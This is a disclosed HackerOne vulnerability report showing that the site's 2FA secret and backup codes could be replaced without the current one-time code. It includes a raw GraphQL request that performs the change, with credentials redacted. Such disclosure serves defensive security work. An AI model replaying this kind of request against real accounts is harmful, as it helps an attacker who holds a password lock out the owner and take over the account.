# Changing the 2FA secret key and backup codes without knowing the 2FA OTP

## Report Details
- **Report ID**: 1139535
- **URL**: https://hackerone.com/reports/1139535
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-03-29T06:25:48.715Z
- **Disclosed**: 2021-05-06T06:30:09.775Z

## Reporter
- **Username**: whhackersbr
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: security

## Vulnerability Information
## Summary:

 After the setup of 2FA, disabling or editing it should require the 2FA OTP.
But it can be bypassed.

## Steps To Reproduce:

1) Sign in to a new HackerOne account.
2) Setup 2FA; and
3) Try to disable it without knowing the OTP.

You can't, you need to know the `Authentication Code` or `Backup Code`.

{F1246364}

Let's bypass it:

1) Open Google Authenticator and create a new account using `██████` as the setup key;
2) Sign in to your HackerOne account;
3) Replay the HTTP Request below (update `X-Auth-Token`, `password`, and `otp_code` using the OTP generated on Google Authenticator):

```
POST /graphql HTTP/1.1
Host: hackerone.com
content-type: application/json
X-Auth-Token: ******************************
Content-Length: 1221

{"operationName":"UpdateTwoFactorAuthenticationCredentials","variables":{"password":"******************************","otp_code":"******************************","signature":"f3a55d33972b3ac5433dc1ea3f36bed8b6813bf9","backup_codes":["b144ab9f9bc17195","09cc146d7a382931","95bd3133a5bab481","b54d2a14acc7ff0b","46f36d0d72096963"],"totp_secret":"███████","backup_code":"b144ab9f9bc17195"},"query":"mutation UpdateTwoFactorAuthenticationCredentials($password: String!, $otp_code: String!, $backup_code: String!, $totp_secret: String!, $backup_codes: [String]!, $signature: String!) {\n  updateTwoFactorAuthenticationCredentials(input: {password: $password, otp_code: $otp_code, backup_code: $backup_code, totp_secret: $totp_secret, backup_codes: $backup_codes, signature: $signature}) {\n    was_successful\n    errors(first: 100) {\n      edges {\n        node {\n          id\n          type\n          field\n          message\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    me {\n      id\n      remaining_otp_backup_code_count\n      totp_supported\n      totp_enabled\n      remaining_otp_backup_code_count\n      account_recovery_phone_number\n      __typename\n    }\n    __typename\n  }\n}\n"}
```

The 2FA secret key and backup codes will be changed.
You didn't need to know the old 2FA OTP to make the changes.

{F1246361}

4) Sign out and try to sign in again.
Now you need to use the new 2FA OTP, the old one doesn't work anymore.

## Recommendation:

Don't allow changes on 2FA configuration without confirming that the user knows the 2FA OTP.

## Impact

An attacker can change the 2FA secret key and backup codes without knowing the 2FA OTP of the victim.

## Attachments
- Captura_de_Tela_2021-03-29_a_s_03.16.57.png
- Captura_de_Tela_2021-03-29_a_s_03.21.15.png
